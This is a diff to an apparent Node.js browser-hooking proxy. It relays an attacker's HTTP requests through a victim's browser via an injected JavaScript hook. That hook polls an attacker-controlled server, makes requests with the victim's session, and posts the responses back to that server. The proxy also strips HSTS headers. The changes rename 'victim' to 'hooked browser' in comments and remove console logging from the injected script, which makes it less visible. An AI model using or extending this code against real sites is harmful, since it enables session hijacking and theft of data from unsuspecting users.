@@ -68,7 +68,7 @@ proxy.createServer(function (req, res) {
             var new_task = {"id": task_counter++, "method": req.method, "url": url, "head": req.headers, "body": body}
             tasks_pending.push(new_task);
             
-            // Handles the response from the task given to the "victim"
+            // Handles the response from the task given to the hooked browser
             task_callbacks[new_task.id] = function (result) {
                 var headers = result.headers;
                 var headers = str2json(headers);
@@ -89,10 +89,10 @@ proxy.createServer(function (req, res) {
                 var body_length = body.length;
                 var headers = updateContentLength(headers, body_length);
 
-	            console.log("[+] Received status: " + result.status);
-	            if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers); }
-	            if (config.debug) { console.log("[+] Received body:\n" + body); }
-	            console.log("[+] -------------------------------- [+]");
+	        console.log("[+] Received status " + result.status + " [" + body_length + " bytes]");
+                if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers); }
+                if (config.debug) { console.log("[+] Received body:\n" + body); }
+                console.log("[+] -------------------------------- [+]");
 
                 res.writeHead(result.status, headers);
                 res.end(body);
@@ -124,10 +124,10 @@ proxy.createServer(function (req, res) {
             var body_length = body.length;
             var headers = updateContentLength(headers, body_length);
 
-	        console.log("[+] Received status: " + result.status);
-	        if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers); }
-	        if (config.debug) { console.log("[+] Received body:\n" + body); }
-	        console.log("[+] -------------------------------- [+]");
+            console.log("[+] Received status " + result.status + " [" + body_length + " bytes]");
+            if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers); }
+            if (config.debug) { console.log("[+] Received body:\n" + body); }
+            console.log("[+] -------------------------------- [+]");
 
             res.writeHead(result.status, headers);
             res.end(body);
@@ -169,8 +169,7 @@ web.createServer(https_options, function (req, res) {
         if (tasks_pending.length > 0) {
             data = JSON.stringify(tasks_pending);
             if (config.debug) { 
-                console.log("[+] Tasks pending"); 
-                console.log(data); 
+                console.log("[+] Tasks pending"); console.log(data); 
                 console.log("[+] -------------------------------- [+]");
             }
             res.writeHead(200);
@@ -225,7 +224,7 @@ web.createServer(https_options, function (req, res) {
 });
 
 
-/* Removes HSTS header */
+/* Removes unwanted headers, such as HSTS */
 function stripHeaders(headers) {
     delete headers['strict-transport-security'];
     delete headers['content-encoding'];
@@ -268,7 +267,7 @@ console.log("[+] Payload:\r\n" + hook + "\r\n");
 
 var hook_file = `
 function makeRequest(id, method, url, head, body) {
-    // Forcing the "victim" browser to perform the request
+    // Forcing the hooked browser to perform the request
     var target_http = new XMLHttpRequest();
     target_http.responseType = 'blob';
     target_http.onreadystatechange = function() {
@@ -296,7 +295,6 @@ function makeRequest(id, method, url, head, body) {
             mygg_http.open("POST", "//${config.web_domain}:${config.web_port}/responses", true);
             mygg_http.send(formData);
         }
-
     };
     
     target_http.open(method, url, true);
@@ -314,11 +312,8 @@ function poll() {
     var mygg_http = new XMLHttpRequest();
     mygg_http.onreadystatechange = function () {
         if (mygg_http.readyState == 4 && mygg_http.status == 200) {
-            console.log("Got new task:")
-            console.log(mygg_http.responseText)
             var tasks = JSON.parse(mygg_http.responseText);
             for (var i in tasks){
-                console.log("TASK");console.log(tasks[i]);
                 makeRequest(tasks[i].id, tasks[i].method, tasks[i].url, tasks[i].head, tasks[i].body);
             }
         }
